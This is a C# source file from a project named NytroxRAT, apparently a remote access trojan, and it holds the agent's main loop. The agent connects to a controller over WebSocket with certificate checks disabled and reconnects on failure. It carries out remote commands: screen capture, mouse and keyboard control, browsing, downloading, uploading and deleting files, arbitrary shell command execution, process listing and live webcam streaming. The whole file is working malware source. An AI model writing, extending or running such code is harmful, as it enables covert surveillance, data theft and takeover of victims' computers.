using System.IO;
using System.Net.WebSockets;
using System.Text.Json;
using NytroxRAT.Agent.Services;
using NytroxRAT.Shared.Crypto;
using NytroxRAT.Shared.Models;

namespace NytroxRAT.Agent;

public class AgentRunner
{
    private const int RecvBufferSize = 20 * 1024 * 1024;

    private readonly ScreenCaptureService   _screen   = new();
    private readonly InputService           _input    = new();
    private readonly FileService            _files    = new();
    private readonly CommandService         _commands = new();
    private readonly MonitoringService      _monitor  = new();
    private readonly WebcamCaptureService   _webcam   = new();
    private CancellationTokenSource?        _webcamCts;
    private byte[]?                         _cryptoKey;

    public async Task RunAsync(CancellationToken ct)
    {
        _cryptoKey = PacketCrypto.DeriveKey(Settings.Secret);

        try
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    var url = Settings.GetUrl();
                    Console.WriteLine($">> Connecting to {url}");
                    using var ws = new ClientWebSocket();
                    ws.Options.SetBuffer(RecvBufferSize, RecvBufferSize);
                    ws.Options.Proxy = null;
                    if (Settings.UseWss)
                        ws.Options.RemoteCertificateValidationCallback = (_, _, _, _) => true;

                    await ws.ConnectAsync(new Uri(url), ct);
                    Console.WriteLine(">> Session established.");

                    using var statsCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    _ = StatsLoop(ws, statsCts.Token);

                    while (ws.State == WebSocketState.Open && !ct.IsCancellationRequested)
                    {
                        var pkt = await Recv(ws, ct);
                        if (pkt == null) break;
                        await Handle(ws, pkt, ct);
                    }

                    await statsCts.CancelAsync();
                    _webcamCts?.Cancel();
                    Console.WriteLine(">> Disconnected. Retrying in 5s...");
                    await Task.Delay(5000, ct);
                }
                catch (Exception ex) when (ex is not OperationCanceledException)
                {
                    Console.WriteLine($">> Error: {ex.Message}");
                    await Task.Delay(5000, ct);
                }
            }
        }
        finally
        {
            _webcamCts?.Cancel();
            _webcamCts?.Dispose();
            _monitor.Dispose();
        }
    }

    private async Task Handle(ClientWebSocket ws, Packet p, CancellationToken ct)
    {
        switch (p.Type)
        {
            case PacketType.ScreenRequest:
                await Send(ws, Enc(new Packet { Type = PacketType.ScreenFrame, Payload = J(_screen.Capture()) }), ct);
                break;
            case PacketType.MouseMove:
                if (Dec<MouseMovePayload>(p) is { } mm) _input.MoveMouse(mm);
                break;
            case PacketType.MouseClick:
                if (Dec<MouseClickPayload>(p) is { } mc) _input.Click(mc);
                break;
            case PacketType.KeyPress:
                if (Dec<KeyPressPayload>(p) is { } kp) _input.KeyEvent(kp);
                break;
            case PacketType.FileListRequest:
            {
                var path = Dec<FileListRequest>(p)?.Path ?? @"C:\";
                await Send(ws, Enc(new Packet { Type = PacketType.FileListResponse, Payload = J(_files.ListDirectory(path)) }), ct);
                break;
            }
            case PacketType.FileDownloadRequest:
            {
                var path = Dec<FileDownloadRequest>(p)?.Path ?? "";
                await Send(ws, Enc(new Packet { Type = PacketType.FileDownloadResponse, Payload = J(_files.DownloadFile(path)) }), ct);
                break;
            }
            case PacketType.FileUploadRequest:
            {
                var up = Dec<FileUploadRequest>(p);
                if (up != null)
                    await Send(ws, Enc(new Packet { Type = PacketType.FileUploadResponse, Payload = J(_files.UploadFile(up)) }), ct);
                break;
            }
            case PacketType.FileDeleteRequest:
            {
                var path = Dec<FileDeleteRequest>(p)?.Path ?? "";
                await Send(ws, Enc(new Packet { Type = PacketType.FileDeleteResponse, Payload = J(_files.DeletePath(path)) }), ct);
                break;
            }
            case PacketType.CommandExecute:
            {
                var cmd = Dec<CommandExecutePayload>(p)?.Command ?? "";
                await _commands.ExecuteAsync(cmd, async (line, isErr, done) =>
                    await Send(ws, Enc(new Packet
                    {
                        Type    = PacketType.CommandOutput,
                        Payload = J(new CommandOutputPayload { Output = line, IsError = isErr, IsFinished = done })
                    }), ct), ct);
                break;
            }
            case PacketType.ProcessList:
                await Send(ws, Enc(new Packet { Type = PacketType.ProcessList, Payload = J(_monitor.GetProcessList()) }), ct);
                break;
            case PacketType.Ping:
                await Send(ws, new Packet { Type = PacketType.Pong }, ct);
                break;
            case PacketType.WebcamListRequest:
                await Send(ws, Enc(new Packet { Type = PacketType.WebcamListResponse, Payload = J(_webcam.ListDevices()) }), ct);
                break;
            case PacketType.WebcamRequest:
            {
                _webcamCts?.Cancel();
                _webcamCts?.Dispose();
                _webcamCts = new CancellationTokenSource();
                var idx = Dec<WebcamRequestPayload>(p)?.CameraIndex ?? 0;
                var wct = _webcamCts;
                _ = WebcamLoopAsync(ws, idx, ct, wct);
                break;
            }
            case PacketType.WebcamStop:
                _webcamCts?.Cancel();
                _webcam.Stop();
                break;
        }
    }

    private async Task WebcamLoopAsync(ClientWebSocket ws, int camIndex, CancellationToken connectionCt, CancellationTokenSource webcamStop)
    {
        using var linked = CancellationTokenSource.CreateLinkedTokenSource(connectionCt, webcamStop.Token);
        var loopCt = linked.Token;
        _webcam.Stop();
        _webcam.Start(camIndex);
        try
        {
            while (ws.State == WebSocketState.Open && _webcam.IsRunning && !loopCt.IsCancellationRequested)
            {
                var frame = _webcam.Capture(camIndex);
                if (frame != null)
                    await Send(ws, Enc(new Packet { Type = PacketType.WebcamFrame, Payload = J(frame) }), loopCt);
                await Task.Delay(200, loopCt);
            }
        }
        catch (OperationCanceledException) { /* expected */ }
        catch { /* non-fatal */ }
        finally { _webcam.Stop(); }
    }

    private async Task StatsLoop(ClientWebSocket ws, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested && ws.State == WebSocketState.Open)
        {
            try
            {
                await Send(ws, Enc(new Packet { Type = PacketType.SystemStats, Payload = J(_monitor.GetSystemStats()) }), ct);
                await Task.Delay(2000, ct);
            }
            catch (OperationCanceledException) { break; }
            catch { }
        }
    }

    private string J<T>(T o) => JsonSerializer.Serialize(o);

    private Packet Enc(Packet p)
    {
        if (_cryptoKey != null) p.Payload = PacketCrypto.EncryptJson(p.Payload, _cryptoKey);
        return p;
    }

    private T? Dec<T>(Packet p)
    {
        try
        {
            var j = _cryptoKey != null ? PacketCrypto.DecryptJson(p.Payload, _cryptoKey) : p.Payload;
            return JsonSerializer.Deserialize<T>(j);
        }
        catch { return default; }
    }

    private static async Task Send(ClientWebSocket ws, Packet p, CancellationToken ct)
        => await ws.SendAsync(JsonSerializer.SerializeToUtf8Bytes(p), WebSocketMessageType.Text, true, ct);

    private static async Task<Packet?> Recv(ClientWebSocket ws, CancellationToken ct)
    {
        var buf = new byte[RecvBufferSize];
        using var ms = new MemoryStream();
        WebSocketReceiveResult r;
        do
        {
            r = await ws.ReceiveAsync(buf, ct);
            if (r.MessageType == WebSocketMessageType.Close) return null;
            ms.Write(buf, 0, r.Count);
        } while (!r.EndOfMessage);

        return JsonSerializer.Deserialize<Packet>(ms.ToArray());
    }
}
